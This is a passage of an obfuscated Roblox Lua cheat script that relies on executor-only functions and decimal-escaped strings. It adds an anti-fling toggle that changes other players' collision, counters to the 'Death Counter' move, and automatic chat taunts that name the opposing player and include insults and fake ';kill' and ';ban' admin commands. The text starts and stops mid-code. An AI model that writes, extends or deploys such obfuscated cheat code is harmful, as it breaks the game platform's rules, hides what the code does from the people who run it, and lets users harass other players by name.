 local _lIIlIIIlII, err = pcall(_lIIIllllll, _lllIIlllll) if not _lIIlIIIlII then warn("\091\082\101\118\101\110\097\110\116\032\070\108\105\110\103\093\032\080\104\097\110\116\097\070\108\105\110\103\032\101\114\114\111\114\058\032" .. tostring(err)) end
 if not _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] then _lIIlIlllIl() end
 if _IllllllllI == nil then local _lIlIllIIlI = _IllIlIlIII(_lllIIlllll) _IlIIllIIII[_lIlIllIIlI] = nil end
 end
 end
 _lIlIlIllIl() _IIlllllIll = false _IlIIlIlIII = false _IIlIIIlllI = nil _IllIlIIIII() if _llIIllIIIl then _llIIllIIIl:Disconnect() _llIIllIIIl = nil end
 _lIIlIlllII:Disconnect() end
 ) end
 local function _IIIIIlIIII() if not _IIllIlIlIl then return end
 _IIllIlIlIl = false if _llIIllIIIl then _llIIllIIIl:Disconnect() _llIIllIIIl = nil end
 pcall( function () for _lllIlllIIl, _IIIIIlIlll in pairs(_IlIIllIIII) do if _IIIIIlIlll and _IIIIIlIlll.Character then local _IlIIIIIIll = _IIIIIlIlll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IlIIIIIIll.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IlIIIIIIll.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IlIIIIIIll.Velocity = Vector3.zero end
 ) pcall( function () _IlIIIIIIll.RotVelocity = Vector3.zero end
 ) end
 end
 end
 end
 ) _IllIlIIIII() end
 _llIIIlIIll.CharacterAdded:Connect( function () if _IlIIlIllIl and _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] and _IlIIlIlIlI() > 0x0 then task.wait(1.5) if _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] and not _IIllIlIlIl then _llIIIlllII() end
 end
 end
 ) local function _IlIIIIIIIl() end
 do local _IlIIllIIIl = false local _lIIIIlllIl = nil local function _IlllllIlII(box) box:AddToggle("\065\110\116\105\070\108\105\110\103\084\111\103\103\108\101", { Text = "\065\110\116\105\045\070\108\105\110\103", Default = false, Callback = function (Value) if Value then if _IlIIllIIIl then return end
 _IlIIllIIIl = true _lIIIIlllIl = RunService.Stepped:Connect( function () for _lllIlllIIl, _lllIIlllll in pairs(Players:GetPlayers()) do if _lllIIlllll ~= _llIIIlIIll and _lllIIlllll.Character then for _lllIlllIIl, _lIIIIIIIII in pairs(_lllIIlllll.Character:GetDescendants()) do if _lIIIIIIIII:IsA("\066\097\115\101\080\097\114\116") then _lIIIIIIIII.CanCollide = false end
 end
 end
 end
 end
 ) else _IlIIllIIIl = false if _lIIIIlllIl then _lIIIIlllIl:Disconnect() _lIIIIlllIl = nil end
 end
 end
 }) table.insert(_llIlllIlIl, function () _IlIIllIIIl = false if _lIIIIlllIl then _lIIIIlllIl:Disconnect() _lIIIIlllIl = nil end
 pcall( function () _IIlIlIIlIl.AntiFlingToggle:SetValue(false) end
 ) end
 ) end
 getgenv()._revenantAntiFlingBuild = _IlllllIlII end
 if _IllIlllllI[_lIIIlIIllI] then local _lIIIllllII = false local _lIIIIIlIlI = {} local _IllIIllIIl = {} local _lIlllIIIII = {} local _llllllIIIl = setmetatable({}, { __mode = "\107" }) local _IllIlIlIll = function () end
 local function _llIIIIIllI(_IIlIlIIIII) return _IIlIlIIIII:IsA("\065\099\099\101\115\115\111\114\121") and _IIlIlIIIII.Name == "\067\111\117\110\116\101\114" end
 local _lIllIlllll = {} local _lIllIIlIll = {} local function _lIIllIlllI(_lllIIlllll) _IllIIllIIl[_lllIIlllll] = nil _lIllIlllll[_lllIIlllll] = nil end
 local _llIIlIllIl = game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101") local _IIllllIlll = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") local function _lllIlIIlII(_IIllllIlII, _lllIIlllll, counterChild) if _IllIIllIIl[_lllIIlllll] then return end
 _IllIIllIIl[_lllIIlllll] = true local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _llIIlIIlII then return end
 task.spawn( function () local _llIIlIIIlI = Instance.new("\083\111\117\110\100") _llIIlIIIlI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\054\052\055\054\055\057\049\050\048\053" _llIIlIIIlI.Volume = 0xA _llIIlIIIlI.Parent = _llIIlIIlII _llIIlIIIlI:Play() local _lIIlIIIlII, template = pcall( function () return _IIllllIlll:WaitForChild("\082\101\115\111\117\114\099\101\115", 0x5) :WaitForChild("\076\101\103\097\099\121\082\101\112\108\105\099\097\116\105\111\110", 0x5) :WaitForChild("\077\101\110\097\099\105\110\103", 0x5) end
 ) if not _lIIlIIIlII or not template then return end
 local _IIIlllllll = {} for menacingIdx = 0x1, 0xA do local _lllIlIlIll = Random.new():NextNumber(0.9, 1.1) local _lllIIllIII = template:Clone() _lllIIllIII.Enabled = true _lllIIllIII.Size = UDim2.new(_lllIlIlIll, 0x0, _lllIlIlIll, 0x0) local _IIIIIlllll = Random.new():NextNumber(-0x4, 0x4) local _IlllllllII = math.random(-0x4, 0x4) _lllIIllIII.StudsOffsetWorldSpace = Vector3.new(_IIIIIlllll, 0x0, _IlllllllII) _lllIIllIII.Parent = _llIIlIIlII table.insert(_IIIlllllll, _lllIIllIII) task.delay(menacingIdx, function () if _lllIIllIII.Parent then local _lIllIIIIII = table.find(_IIIlllllll, _lllIIllIII) if _lIllIIIIII then table.remove(_IIIlllllll, _lIllIIIIII) end
 _llIIlIllIl:Create(_lllIIllIII, TweenInfo.new(0x1, Enum.EasingStyle.Back, Enum.EasingDirection.In), { StudsOffsetWorldSpace = _lllIIllIII.StudsOffsetWorldSpace - Vector3.new(0x0, 0xA, 0x0) } ):Play() _llIIlIllIl:Create(_lllIIllIII.ImageLabel, TweenInfo.new(0x1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0x1 } ):Play() end
 end
 ) end
 local _lIIlIIIlII = {} while task.wait() do for _lllIlllIIl, menacingBillboard in pairs(_IIIlllllll) do if not _lIIlIIIlII[menacingBillboard] then _lIIlIIIlII[menacingBillboard] = menacingBillboard.StudsOffsetWorldSpace end
 local _IIlIlllIIl = Random.new():NextNumber(-0.04, 0.04) menacingBillboard.StudsOffsetWorldSpace = _lIIlIIIlII[menacingBillboard] + Vector3.new(_IIlIlllIIl, _IIlIlllIIl, _IIlIlllIIl) end
 if not (counterChild and counterChild.Parent) then local _IIlIIlllll = _IIIlllllll for _lllIlllIIl, snapshotBillboard in pairs(_IIlIIlllll) do local _lIllIlIIll = Random.new():NextNumber(0x2, 0x3) _llIIlIllIl:Create(snapshotBillboard, TweenInfo.new(_lIllIlIIll, Enum.EasingStyle.Back, Enum.EasingDirection.In), { StudsOffsetWorldSpace = (_lIIlIIIlII[snapshotBillboard] or snapshotBillboard.StudsOffsetWorldSpace) - Vector3.new(0x0, 0xA, 0x0) } ):Play() _llIIlIllIl:Create(snapshotBillboard.ImageLabel, TweenInfo.new(_lIllIlIIll, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { ImageTransparency = 0x1 } ):Play() end
 task.delay(0x3, function () for _lllIlllIIl, oldBillboard in pairs(_IIlIIlllll) do pcall( function () oldBillboard:Destroy() end
 ) end
 end
 ) break end
 end
 end
 ) end
 local function _lIlIIIllIl(_IIllllIlII, _lllIIlllll) if not _IIllllIlII or not _lllIIlllll or _lllIIlllll == _llIIIlIIll then return end
 if _lIllIIlIll[_IIllllIlII] then return end
 _lIllIIlIll[_IIllllIlII] = true for _lllIlllIIl, _IIlIlIIIII in pairs(_IIllllIlII:GetChildren()) do if _llIIIIIllI(_IIlIlIIIII) then if _lIIIllllII and not _lIllIlllll[_lllIIlllll] then MoveNotify(_lllIIlllll, "\068\101\097\116\104\032\067\111\117\110\116\101\114") _lIllIlllll[_lllIIlllll] = true _lllIlIIlII(_IIllllIlII, _lllIIlllll, _IIlIlIIIII) end
 _IIlIlIIIII.AncestryChanged:Connect( function () if not _IIlIlIIIII.Parent then _lIIllIlllI(_lllIIlllll) end
 end
 ) end
 end
 local _IllIIIllII = _IIllllIlII.ChildAdded:Connect( function (_IIlIlIIIII) if not _lIIIllllII then return end
 if not _llIIIIIllI(_IIlIlIIIII) then return end
 MoveNotify(_lllIIlllll, "\068\101\097\116\104\032\067\111\117\110\116\101\114") if _lIllIlllll[_lllIIlllll] then return end
 _lIllIlllll[_lllIIlllll] = true task.defer( function () _lllIlIIlII(_IIllllIlII, _lllIIlllll, _IIlIlIIIII) end
 ) _IIlIlIIIII.AncestryChanged:Connect( function () if not _IIlIlIIIII.Parent then _lIIllIlllI(_lllIIlllll) end
 end
 ) end
 ) table.insert(_lIIIIIlIlI, _IllIIIllII) end
 local function _lIllIIIlIl(_lllIIlllll) if _lllIIlllll == _llIIIlIIll then return end
 if _lllIIlllll.Character then task.spawn(_lIlIIIllIl, _lllIIlllll.Character, _lllIIlllll) end
 local _IllIIIllII = _lllIIlllll.CharacterAdded:Connect( function (_IIllllIlII) if not _lIIIllllII then return end
 _lIIllIlllI(_lllIIlllll) task.wait(0.1) _lIlIIIllIl(_IIllllIlII, _lllIIlllll) end
 ) table.insert(_lIIIIIlIlI, _IllIIIllII) end
 local _IlIlIlIlII = _IIIllIlllI table.insert(_llIlllIlIl, function () _lIIIllllII = false for _lllIlllIIl, _IIIlIlllll in pairs(_lIIIIIlIlI) do pcall(_IIIlIlllll.Disconnect, _IIIlIlllll) end
 _lIIIIIlIlI = {} _IllIIllIIl = {} _lIllIlllll = {} _lIllIIlIll = {} pcall( function () _IIlIlIIlIl.ShowDeathCounter:SetValue(false) end
 ) end
 ) local _lIlllllIll = nil local _IIlllllIIl = nil local function _llllllIIIl() return _IlIllIIllI.AntiMoves_Saitama and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114") end
 local function _llllIlllll() local _lllIIIlIII = _IlIllIIllI.AntiDCWaitBeforeKillDD and _IlIllIIllI.AntiDCWaitBeforeKillDD.Value if _lllIIIlIII == "\051\115\032\045\032\070\097\107\101\111\117\116" then return 0x3 end
 if _lllIIIlIII == "\053\115\032\045\032\076\111\110\103\032\070\097\107\101\111\117\116" then return 0x5 end
 return 0x0 end
 local function _IlllIlIIll(_IlIIIllIlI) local _IIlIIIIlll = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101") local _llIIIIllII = _IIlIIIIlll.TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _llIIIIllII then _llIIIIllII:SendAsync(_IlIIIllIlI) end
 end
 local _IlllIIIllI = { "\065\104\032\121\101\115\046\046\046\077\121\032\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\116\101\099\104\110\105\113\117\101\046\032\079\110\101\032\105\032\104\097\118\101\110\039\116\032\117\115\101\100\032\115\105\110\099\101\032\116\104\101\032\072\101\105\097\110\032\101\114\097\046", "\089\111\117\032\100\097\114\101\032\116\114\121\032\097\110\100\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\063\032\073\039\108\108\032\097\108\108\111\119\032\105\116\032\111\110\099\101\046\032\084\104\101\114\101\032\119\111\110\039\116\032\098\101\032\097\032\115\101\099\111\110\100\032\116\105\109\101\046", "\075\110\111\119\032\121\111\117\114\032\112\108\097\099\101\044\032\102\111\111\108\046", "\076\101\116\039\115\032\104\097\118\101\032\097\032\099\111\110\116\101\115\116\032\111\102\032\102\105\114\101\112\111\119\101\114\046\032\065\114\109\032\121\111\117\114\115\101\108\102\046", "\073\032\102\111\117\103\104\116\032\115\119\101\097\116\115\032\097\110\100\032\110\111\111\098\115\032\097\032\116\104\111\117\115\097\110\100\032\121\101\097\114\115\032\097\103\111\044\032\121\111\117\114\032\115\116\105\108\108\032\111\110\101\032\111\102\032\116\104\101\032\098\101\116\116\101\114\032\111\110\101\115\046\032\083\116\097\110\100\032\080\114\111\117\100\044\032\089\111\117\032\097\114\101\032\115\116\114\111\110\103\046", "\083\116\097\110\100\032\080\114\111\117\100\044\032\089\111\117\032\097\114\101\032\115\116\114\111\110\103\046", "\073\102\032\105\032\119\097\115\110\039\116\032\097\032\115\099\114\105\112\116\101\114\044\032\116\104\097\116\032\119\111\117\108\100\032\104\097\118\101\032\101\108\105\109\105\110\097\116\101\100\032\109\101\032\111\110\032\116\104\101\032\102\105\114\115\116\032\098\108\111\119\046", "\089\111\117\039\118\101\032\100\111\110\101\032\105\116\032\110\111\119\044\032\098\114\097\116\033", "\073\032\107\110\101\119\032\105\116\046\032\089\111\117\039\114\101\032\115\105\109\105\108\097\114\032\116\111\032\097\108\108\032\116\104\111\115\101\032\098\114\097\116\115\032\119\104\111\032\116\114\105\101\100\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\046", "\089\111\117\032\102\111\108\108\111\119\032\109\121\032\109\111\118\101\109\101\110\116\044\032\097\110\100\032\097\116\116\097\099\107\032\119\105\116\104\032\100\101\097\116\104\032\099\111\117\110\116\101\114\046\032\073\116\032\115\116\097\114\116\101\100\032\104\097\112\112\101\110\105\110\103\032\097\102\116\101\114\032\121\111\117\114\032\117\108\116\105\109\097\116\101\032\097\099\116\105\118\097\116\101\100\046", "\084\104\101\032\097\099\116\105\118\097\116\105\111\110\032\111\102\032\116\104\101\032\115\116\114\111\110\103\101\115\116\039\032\117\108\116\105\109\097\116\101\032\097\110\100\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\098\111\116\104\032\114\101\112\114\101\115\101\110\116\032\112\101\114\102\101\099\116\032\099\121\099\108\101\115\032\111\102\032\099\104\097\111\115\032\097\110\100\032\112\101\097\099\101\046", "\089\111\117\114\032\097\098\105\108\105\116\121\032\097\115\032\105\039\118\101\032\115\101\101\110\046\046\046\046\073\115\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\097\110\121\116\104\105\110\103\032\097\110\100\032\101\118\101\114\121\116\104\105\110\103\046\032\073\116\039\115\032\116\104\101\032\117\108\116\105\109\097\116\101\032\099\111\117\110\116\101\114\033", "\089\111\117\032\109\105\103\104\116\032\104\097\118\101\032\100\101\102\101\097\116\101\100\032\109\101\032\105\102\032\105\032\119\097\115\110\039\116\032\097\032\115\099\114\105\112\116\101\114\032\098\097\099\107\032\116\104\101\110\046", "\068\111\109\097\105\110\032\069\120\112\097\110\115\105\111\110\058\032\083\104\097\100\111\119\032\082\101\097\108\109", "\070\117\103\097\032\040\079\112\101\110\041", } local _IIIIIllIIl = { "\073\032\097\108\111\110\101\044\032\097\109\032\084\104\101\032\072\111\110\111\117\114\101\100\032\079\110\101\046", "\084\104\101\032\119\111\114\108\100\032\106\117\115\116\032\102\101\101\108\115\032\115\111\032\119\111\110\100\101\114\102\117\108\032\114\105\103\104\116\032\110\111\119\046\046", "\078\097\104\044\032\073\039\100\032\087\105\110\046", "\073\102\032\105\032\119\111\117\108\100\032\103\101\116\032\104\105\116\032\098\121\032\100\101\097\116\104\032\099\111\117\110\116\101\114\044\032\105\116\032\119\111\117\108\100\032\099\097\117\115\101\032\109\101\032\097\032\108\105\116\116\108\101\032\116\114\111\117\098\108\101\044\032\098\117\116\032\105\032\119\111\117\108\100\032\119\105\110\046", "\068\111\109\097\105\110\032\069\120\112\097\110\115\105\111\110\058\032\073\110\102\105\110\105\116\101\032\086\111\105\100", "\092\117\123\053\102\048\102\125\058\032\092\117\123\051\048\097\050\125\092\117\123\051\048\102\051\125\092\117\123\051\048\099\049\125\092\117\123\051\048\099\055\125\092\117\123\051\048\098\057\125\092\117\123\051\048\097\098\125\092\117\123\051\048\097\054\125\092\117\123\051\048\102\051\125\092\117\123\051\048\098\102\125\092\117\123\051\048\102\099\125\032\040\073\109\097\103\105\110\097\114\121\032\084\101\099\104\110\105\113\117\101\058\032\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\041", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\114\105\101\100\032\116\111\032\115\112\108\105\116\032\109\101\032\105\110\032\104\097\108\102\044\032\098\117\116\032\071\111\106\111\032\097\108\119\097\121\115\032\119\105\110\115\046", "\089\079\085\032\076\079\079\075\032\085\071\076\073\069\082\032\084\072\065\078\032\069\086\069\082\044\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\033\033", } local _llIllIIIII = { { Quote = "\073\116\032\116\111\111\107\032\109\101\032\097\032\119\104\105\108\101\046\046", WaitTime = 0x2 }, { Quote = "\066\117\116\032\073\032\102\105\110\097\108\108\121\032\103\114\097\115\112\101\100\032\105\116\032\111\110\032\116\104\101\032\118\101\114\103\101\032\111\102\032\100\101\097\116\104\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\046\046", WaitTime = 0x2 }, { Quote = "\084\104\101\032\116\114\117\101\032\101\115\115\101\110\099\101\032\111\102\032\099\117\114\115\101\100\032\101\110\101\114\103\121\046\046", WaitTime = 0x2 }, { Quote = "\082\069\086\069\082\083\069\032\067\085\082\083\069\068\032\084\069\067\072\078\073\081\085\069\033\033", WaitTime = 0x0 }, } local _lIllllIlll = { "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\114\105\101\100\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\104\105\110\107\115\032\104\101\032\099\097\110\032\119\105\110\032\119\105\116\104\032\100\101\097\116\104\032\099\111\117\110\116\101\114\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\100\101\097\116\104\032\099\111\117\110\116\101\114\101\100\032\109\101\046\032\066\117\116\032\105\032\114\101\102\117\115\101\100\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\105\115\032\097\110\032\105\100\105\111\116\032\102\111\114\032\116\114\121\105\110\103\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\046", "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\032\116\114\105\101\100\032\116\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\032\109\101\046", "\100\105\100\032\121\111\117\032\114\101\097\108\108\121\032\116\104\105\110\107\032\121\111\117\032\099\111\117\108\100\032\107\105\108\108\032\109\101\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\046\046\046\046\063", "\073\039\109\032\110\111\116\032\103\111\110\110\097\032\108\101\116\032\116\104\097\116\032\115\108\105\100\101\044\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097\046", } local _lllIlIIllI = { "\059\107\105\108\108\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\114\101\115\112\097\119\110\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\107\105\099\107\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\098\097\110\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", "\059\114\101\032\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", } local function _IIlIIIIIIl(attackerPlayer, _IIlIIIlIII) local _lllIIIlIII = _IlIllIIllI.AntiDCQuotesDD and _IlIllIIllI.AntiDCQuotesDD.Value or "\078\111\032\081\117\111\116\101\115" if _lllIIIlIII == "\078\111\032\081\117\111\116\101\115" then return end
 local _IlIIIIIlll = (_IIlIIIlIII and _IIlIIIlIII ~= "") and _IIlIIIlIII or "\091\112\108\097\099\101\104\111\108\100\101\114\093" if _lllIIIlIII == "\083\117\107\117\110\097\032\081\117\111\116\101\115" then _IlllIlIIll(_IlllIIIllI[math.random(#_IlllIIIllI)]) elseif _lllIIIlIII == "\071\111\106\111\032\081\117\111\116\101\115" then if math.random(0x2) == 0x1 then _IlllIlIIll(_IIIIIllIIl[math.random(#_IIIIIllIIl)] :gsub("\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _IlIIIIIlll) :gsub("\068\069\065\084\072\067\079\085\078\084\069\082\069\082\072\065\072\065", _IlIIIIIlll:upper())) else task.spawn( function () for _lllIlllIIl, entry in ipairs(_llIllIIIII) do _IlllIlIIll(entry.Quote:gsub("\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _IlIIIIIlll)) if entry.WaitTime > 0x0 then task.wait(entry.WaitTime) end
 end
 end
 ) end
 task.spawn( function () local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII then return end
 local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\055\050\055\053\055\057\056\052\052\050" local _llIIllIlIl = _IlIIIlIIII:LoadAnimation(_llllIlIllI) _llIIllIlIl:Play() _llIIllIlIl.TimePosition = 2.5 repeat task.wait() until _llIIllIlIl.TimePosition >= 0x3 local _lllIIIlIII = 0x0 for _lllIlllIIl = 0x1, 0x96 do _lllIIIlIII = _lllIIIlIII + 0.1 _IlIIIlIIII.HipHeight = _lllIIIlIII task.wait() end
 repeat task.wait() until _llIIllIlIl.TimePosition >= 6.5 _llIIllIlIl:AdjustSpeed(0.2) task.wait(0x7) _llIIllIlIl:Stop(0.6) _IlIIIlIIII.HipHeight = 0x0 end
 ) elseif _lllIIIlIII == "\078\097\109\101\032\081\117\111\116\101\115" then _IlllIlIIll(string.gsub(_lIllllIlll[math.random(#_lIllllIlll)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _IlIIIIIlll)) elseif _lllIIIlIII == "\065\100\109\105\110\032\081\117\111\116\101\115" then _IlllIlIIll(string.gsub(_lllIlIIllI[math.random(#_lllIlIIllI)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _IlIIIIIlll)) elseif _lllIIIlIII == "\082\097\110\100\111\109" then local _lIllIIIIII = { "\083\117\107\117\110\097\032\081\117\111\116\101\115", "\071\111\106\111\032\081\117\111\116\101\115", "\078\097\109\101\032\081\117\111\116\101\115", "\065\100\109\105\110\032\081\117\111\116\101\115" } local _IllllIIIlI = _lIllIIIIII[math.random(#_lIllIIIIII)] if _IllllIIIlI == "\083\117\107\117\110\097\032\081\117\111\116\101\115" then _IlllIlIIll(_IlllIIIllI[math.random(#_IlllIIIllI)]) elseif _IllllIIIlI == "\071\111\106\111\032\081\117\111\116\101\115" then _IlllIlIIll(string.gsub(_IIIIIllIIl[math.random(#_IIIIIllIIl)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _IlIIIIIlll)) elseif _IllllIIIlI == "\078\097\109\101\032\081\117\111\116\101\115" then _IlllIlIIll(string.gsub(_lIllllIlll[math.random(#_lIllllIlll)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _IlIIIIIlll)) elseif _IllllIIIlI == "\065\100\109\105\110\032\081\117\111\116\101\115" then _IlllIlIIll(string.gsub(_lllIlIIllI[math.random(#_lllIlIIllI)], "\100\101\097\116\104\099\111\117\110\116\101\114\101\114\104\097\104\097", _IlIIIIIlll)) end
 elseif _lllIIIlIII == "\083\097\110\115\032\081\117\111\116\101\115" then local _lIIllIIlII = { DeathCounterQuote1 = { "\10033\032\108\111\111\107\115\032\108\105\107\101\032\116\104\097\116\032\103\117\121\032\119\104\111\032\100\101\097\116\104\032\099\111\117\110\116\101\114\101\100\032\109\101\032\108\111\111\107\101\100\032\112\114\101\116\116\121\032\102\114\117\115\116\114\097\116\101\100\046", "\10033\032\105\032\109\117\115\116\110\039\116\032\103\111\115\115\105\112\044\032\105\032\119\111\117\108\100\032\098\101\032\097\110\103\114\121\032\116\111\111\046", "\10033\032\121\101\097\104\046\046\046\032\109\097\121\098\101\046" }, DeathCounterQuote2 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\032\119\097\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\114\097\103\101\100\032\116\119\105\099\101\032\105\110\032\097\032\114\111\119\046", "\10033\032\115\117\102\102\105\099\101\032\116\111\032\115\097\121\044\032\116\104\101\121\032\108\111\111\107\101\100\032\114\101\097\108\108\121\046\046\046\032\117\110\115\097\116\105\115\102\105\101\100\046", "\10033\032\097\108\108\032\114\105\103\104\116\046", "\10033\032\104\111\119\032\039\098\111\117\116\032\105\032\109\097\107\101\032\105\116\032\097\032\116\104\105\114\100\063" }, DeathCounterQuote3 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\032\119\097\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\100\105\101\100\032\116\104\114\105\099\101\032\105\110\032\097\032\114\111\119\046", "\10033\032\046\032\046\032\046", "\10033\032\103\117\101\115\115\032\121\111\117\032\099\111\117\108\100\032\115\097\121\046\046\046\032\105\032\116\117\114\110\101\100\032\116\104\097\116\032\115\109\105\108\101\032\117\112\115\105\100\101\032\100\111\119\110\046", "\10033\032\119\104\097\116\115\032\116\104\101\032\112\117\110\099\104\108\105\110\101\063", "\10033\032\105\032\100\111\110\039\116\032\107\110\111\119\046" }, DeathCounterQuote4 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\039\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\117\110\119\105\108\108\105\110\103\032\116\111\032\103\105\118\101\032\117\112\046", "\10033\032\046\032\046\032\046\105\032\099\097\110\039\116\032\099\111\117\110\116\032\097\102\116\101\114\032\052\046", "\10033\032\109\101\032\097\110\100\032\121\111\117\032\109\105\103\104\116\032\098\101\032\115\117\114\112\114\105\115\101\100\032\116\111\032\115\101\101\032\109\111\114\101\032\100\105\097\108\111\103\117\101\046", "\10033\032\100\111\110\039\116\032\119\111\114\114\121\046\032\105\109\032\115\117\114\101\032\105\116\032\101\110\100\115\032\115\111\109\101\119\104\101\114\101\046" }, DeathCounterQuote5 = { "\10033\032\104\109\109\046\032\116\104\101\105\114\032\101\120\112\114\101\115\115\105\111\110\046\046\046", "\10033\032\116\104\097\116\039\115\032\116\104\101\032\101\120\112\114\101\115\115\105\111\110\032\111\102\032\115\111\109\101\111\110\101\032\119\104\111\039\115\032\117\110\119\105\108\108\105\110\103\032\116\111\032\103\105\118\101\032\117\112\046", "\10033\032\100\105\100\032\105\032\103\101\116\032\121\111\117\063\032\100\105\100\032\121\111\117\032\116\104\105\110\107\032\116\104\097\116\032\116\104\101\032\100\105\097\108\111\103\117\101\032\119\097\115\032\103\111\110\110\097\032\114\101\112\101\097\116\063", "\10033\032\100\111\110\039\116\032\119\111\114\114\121\046\032\105\116\115\032\103\111\110\110\097\032\114\101\112\101\097\116\032\115\111\111\110\046", "\10033\032\111\118\101\114\032\097\110\100\032\111\118\101\114\044\032\117\110\116\105\108\032\101\118\101\114\121\116\104\105\110\103\032\105\115\032\114\101\115\101\116\046" }, DeathCounterQuote6 = { "\10033\032\111\117\114\032\114\101\112\111\114\116\115\032\115\104\111\119\101\100\032\097\032\109\097\115\115\105\118\101\032\115\119\101\097\116\032\105\110\032\116\104\101\032\114\111\098\108\111\120\032\099\111\110\116\105\110\117\117\109\046", "\10033\032\112\108\097\121\101\114\115\032\100\097\115\104\105\110\103\032\108\101\102\116\032\097\110\100\032\114\105\103\104\116\044\032\099\111\109\098\111\105\110\103\032\097\110\100\032\100\121\105\110\103\046\046\046", "\10033\032\117\110\116\105\108\032\115\117\100\100\101\110\108\121\044\032\101\118\101\114\121\116\104\105\110\103\032\101\110\100\115\046" }, DeathCounterQuote7 = { "\10033\032\104\101\104\032\104\101\104\032\104\101\104\046\046\046", "\10033\032\121\111\117\032\116\104\105\110\107\032\105\116\039\115\032\116\104\101\032\100\101\118\115\032\102\097\117\108\116\044\032\105\115\110\039\116\032\105\116\063", "\10033\032\121\111\117\032\099\097\110\039\116\032\117\110\100\101\114\115\116\097\110\100\032\104\111\119\032\116\104\105\115\032\102\101\101\108\115\046" }, DeathCounterQuote8 = { "\10033\032\107\110\111\119\105\110\103\032\116\104\097\116\032\111\110\101\032\100\097\121\044\032\119\105\116\104\111\117\116\032\097\110\121\032\119\097\114\110\105\110\103\046\046\046", "\10033\032\105\116\039\115\032\097\108\108\032\103\111\105\110\103\032\116\111\032\098\101\032\117\112\100\097\116\101\100\046", "\10033\032\108\111\111\107\046\032\105\032\103\097\118\101\032\117\112\032\116\114\121\105\110\103\032\116\111\032\103\111\032\098\097\099\107\032\116\111\032\114\097\110\107\032\049\032\097\032\108\111\110\103\032\116\105\109\101\032\097\103\111\046" }, DeathCounterQuote9 = { "\10033\032\103\101\116\116\105\110\103\032\116\111\032\116\104\101\032\108\101\097\100\101\114\098\111\097\114\100\032\100\111\101\115\110\039\116\032\114\101\097\108\108\121\032\097\112\112\101\097\108\032\097\110\121\109\111\114\101\044\032\101\105\116\104\101\114\046", 